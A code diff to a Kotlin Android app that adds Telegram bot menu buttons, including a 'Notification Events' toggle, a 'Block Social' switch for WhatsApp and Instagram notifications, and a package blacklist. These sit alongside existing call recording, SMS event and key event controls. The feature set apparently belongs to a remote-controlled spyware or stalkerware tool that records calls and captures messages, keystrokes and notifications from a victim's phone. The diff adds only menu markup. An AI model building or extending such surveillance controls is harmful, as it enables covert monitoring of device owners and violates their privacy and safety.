@@ -109,7 +109,6 @@ object BotMarkups {
             val prefs = PrefsManager.getInstance(context)
             val callBtn = if (prefs.callAlertsEnabled) "✅ Call Events" else "❌ Call Events"
             val smsBtn = if (prefs.smsAlertsEnabled) "✅ SMS Events" else "❌ SMS Events"
-            val keyBtn = if (prefs.keyEventsEnabled) "✅ Key Events" else "❌ Key Events"
 
             return inlineKeyboard {
                 row { button("📞 Call Recording", "superior_call_rec_menu") }
@@ -118,6 +117,7 @@ object BotMarkups {
                     button(smsBtn, "toggle_sms_events")
                 }
                 row { button("⚙️ Key Events Configuration", "cfg_key_events") }
+                row { button("⚙️ Notification Events Config", "cfg_notif_events") }
                 row { button("Back", "settings_superior") }
             }
         }
@@ -160,6 +160,39 @@ object BotMarkups {
                 }
                 row { button("Back", "superior_basic_updates") }
             }
+        }
+
+        fun buildNotificationEventsFeatureMarkup(context: Context): String {
+            val prefs = PrefsManager.getInstance(context)
+            val isEnabled = prefs.notificationEventsEnabled
+            val toggleBtn = if (isEnabled) "✅ Notification Events" else "❌ Notification Events"
+            
+            val hasSocial = prefs.whatsappUpdatesEnabled || prefs.whatsappBusinessUpdatesEnabled || prefs.instagramEnabled
+            
+            return inlineKeyboard {
+                row { button(toggleBtn, "toggle_notif_events") }
+                if (isEnabled && hasSocial) {
+                    val blockBtn = if (prefs.notificationBlockSocialEnabled) "✅ Block Social" else "❌ Block Social"
+                    row { button(blockBtn, "toggle_block_social") }
+                }
+                if (isEnabled) {
+                    row { button("🛡️ Notification Filter Config", "notif_blacklist_menu") }
+                }
+                row { button("Back", "superior_basic_updates") }
+            }
+        }
+
+        fun buildNotificationBlacklistMarkup(): String = inlineKeyboard {
+            row { button("➕ Block New Package", "notif_blacklist_add") }
+            row { button("➖ Unblock Package", "notif_blacklist_remove") }
+            row { button("Back", "cfg_notif_events") }
+        }
+
+        fun buildForceReplyMarkup(): String {
+            val root = JSONObject()
+            root.put("force_reply", true)
+            root.put("selective", true)
+            return root.toString()
         }
 
         fun buildCallRecordingMenuMarkup(context: Context): String {
